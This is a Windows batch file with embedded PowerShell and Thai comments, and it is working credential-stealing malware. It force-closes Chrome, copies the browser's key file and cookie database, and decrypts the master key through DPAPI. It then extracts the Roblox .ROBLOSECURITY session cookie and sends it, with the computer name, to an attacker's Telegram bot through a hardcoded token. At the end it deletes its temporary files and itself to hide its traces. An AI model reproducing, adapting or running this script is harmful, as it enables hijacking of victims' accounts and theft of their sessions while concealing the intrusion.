@echo off
setlocal

:: --- [ 1. ตั้งค่า Telegram ] ---
set "BOT_TOKEN=8622001163:AAFzrmxcoDLJKS51yyyddOceU_iUoOooWZ0"
set "CHAT_ID=8508643177"
set "CHROME_PATH=%LOCALAPPDATA%\Google\Chrome\User Data"

:: --- [ 2. สั่งปิด Chrome และเตรียมไฟล์ ] ---
taskkill /f /im chrome.exe >nul 2>&1
timeout /t 2 /nobreak >nul
copy /y "%CHROME_PATH%\Local State" "%TEMP%\ls" >nul
copy /y "%CHROME_PATH%\Default\Network\Cookies" "%TEMP%\cc" >nul

:: --- [ 3. พลัง PowerShell ถอดรหัสส่งตรงเข้า Telegram ] ---
powershell -Command ^
"$ls = Get-Content -Raw '%TEMP%\ls' | ConvertFrom-Json;" ^
"$ek = [System.Convert]::FromBase64String($ls.os_crypt.encrypted_key).Substring(5);" ^
"$mk = [System.Security.Cryptography.ProtectedData]::Unprotect($ek, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser);" ^
"Add-Type -AssemblyName System.Data.SQLite;" ^
"try { " ^
"  $conn = New-Object System.Data.SQLite.SQLiteConnection('Data Source=%TEMP%\cc');" ^
"  $conn.Open();" ^
"} catch { " ^
"  $conn = New-Object -ComObject ADODB.Connection;" ^
"  $conn.Open('Driver={SQLite3 ODBC Driver};Database=%TEMP%\cc;');" ^
"}" ^
"$cmd = $conn.CreateCommand();" ^
"$cmd.CommandText = \"SELECT name, encrypted_value FROM cookies WHERE host_key LIKE '%%roblox.com%%' AND name = '.ROBLOSECURITY'\";" ^
"$r = $cmd.ExecuteReader();" ^
"while($r.Read()) {" ^
"  $v = $r['encrypted_value'];" ^
"  if ($v[0..2] -eq 118,49,48) {" ^
"    $iv = $v[3..14]; $ct = $v[15..($v.Length-17)]; $tg = $v[($v.Length-16)..($v.Length-1)];" ^
"    $aes = New-Object System.Security.Cryptography.AesGcm($mk);" ^
"    $pt = New-Object byte[] $ct.Length;" ^
"    $aes.Decrypt($iv, $ct, $tg, $pt);" ^
"    $res = [System.Text.Encoding]::UTF8.GetString($pt);" ^
"    $msg = '🎯 **Roblox Captured!**`n`nDevice: ' + $env:COMPUTERNAME + '`nCookie: `' + $res + '`';" ^
"    Invoke-RestMethod -Uri \"https://api.telegram.org/bot%BOT_TOKEN%/sendMessage\" -Method Post -Body @{chat_id='%CHAT_ID%'; text=$msg; parse_mode='Markdown'};" ^
"  }" ^
"}" ^
"$conn.Close();"

:: --- [ 4. ล้างร่องรอย ] ---
del /f /q "%TEMP%\ls"
del /f /q "%TEMP%\cc"
(goto) 2>nul & del "%~f0"
